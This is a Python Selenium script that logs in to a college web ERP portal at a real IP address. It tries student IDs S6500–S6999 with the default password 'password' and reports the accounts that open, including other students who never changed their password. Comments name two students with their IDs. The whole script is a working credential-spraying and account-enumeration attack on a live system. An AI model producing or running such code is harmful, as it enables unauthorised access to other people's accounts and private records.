from selenium import webdriver
import selenium
from time import sleep

driver = webdriver.Chrome(
        executable_path='C:\\Users\\Sohail21400\\Downloads\\chromedriver_win32\\chromedriver.exe',
        )

driver.get("http://117.239.156.58/Weberp/Default.aspx")
sleep(5)

failed_login_count = 0
# --------------- INITIALIZATION DONE ------------------

# ajay S7013
# jazeel S6981

for user_name in range(6500,7000):

    user_name_box = driver.find_element_by_xpath('//*[@id="txtUserName"]')
    user_name_box.clear()
    user_name_box.send_keys('S' + str(user_name))

    password_box = driver.find_element_by_xpath('//*[@id="txtPassword"]')
    password_box.send_keys("password")

    submit_button = driver.find_element_by_xpath('//*[@id="btnLogin"]')

    # ---------------- LOADED THE MAIN PAGE ----------------
    submit_button.click()
    sleep(3)
    wrong_password = False

    # ----------------- BUTTON CLICKED ---------------------
    try:
        # if we see invalid login..
        error_found = driver.find_element_by_id('lblMessage').text
        # error_found = driver.find_element_by_xpath('//*[@id="lblMessage"]')
        print(error_found)
        if error_found == 'Invalid Login!':
            user_name_box = driver.find_element_by_xpath('//*[@id="txtUserName"]')
            password_box = driver.find_element_by_xpath('//*[@id="txtPassword"]')
            # sleep(1)
            failed_login_count += 1
            wrong_password = True
            user_name_box.clear()
            password_box.clear()

    except selenium.common.exceptions.NoSuchElementException or selenium.common.exceptions.StaleElementReferenceException:
        sleep(4)
        # we got the right account
        # there can be some other student who haven't updated the password
        print("Logged in!")
        # print(user_name)
        # bottom line is not needed but, anyways
        wrong_password = False

    if not wrong_password:
        try:
            find_name = driver.find_element_by_xpath('//*[@id="ctl00_lblUserName"]').text
        except selenium.common.exceptions.NoSuchElementException:
            # sleep(5)
            pass
        my_name = 'SOHAIL P M'
        status = True
        for i in range(4):
            if find_name[i] != my_name[i]:
                status = False
                break
        if status:
            print("thank God!")
            print('name match found')
            print(f'user name = {user_name}')
            print(f'number of tries = {failed_login_count}')
        else:
            print(f'found a user who haven\'t updated the password: {user_name}')
            # should_continue = input("shall I continue?")
            driver.back()
            sleep(3)
            continue

            # if should_continue == 1:
            #     continue
            # elif should_continue == 0:
            #     exit()
            # else:
            #     print("Invalid Statement ")

        print(f'current user name = {user_name}')






